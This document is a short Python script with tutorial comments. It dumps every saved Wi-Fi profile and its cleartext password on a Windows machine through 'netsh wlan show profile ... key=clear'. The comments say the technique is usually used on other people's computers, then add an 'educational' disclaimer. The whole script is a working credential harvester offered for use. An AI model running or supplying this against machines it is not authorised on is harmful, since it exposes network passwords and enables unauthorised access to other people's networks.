# READ ALL THIS BEFORE YOU START!
#------------------------------------------------------#
#Extracting Wifi Passwords From Windows With Python!
#We need open up a command line (Cmder)
#Type in cmd "netsh wlan show profiles"
#And by doing that you get the names or the profiles of all the wifi's that you have been
#connected to in with this particular laptop or computer
# *** its going work on your computer but actually when you're trying yo extract
#wifi passwords you're usually going to do this on other computers
#Again as always I'm not responsible for any illegal activities that you're going
#to do with the knowledge that i providing you here this is purely educational
#so dont do nosense with knowledge here!!
#now " netsh wlan show profile (name of wifi) key=clear
#now you got the Key Content : (NAME)
#-------------------------------------------------------#
import subprocess

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

for wifi in wifis:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
    results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
    try:
        print(f'Name:{wifi}, Password:{results[0]}')
    except IndexError:
        print(f'Name:{wifi}, Password: Cannot be read!')

print(wifis)
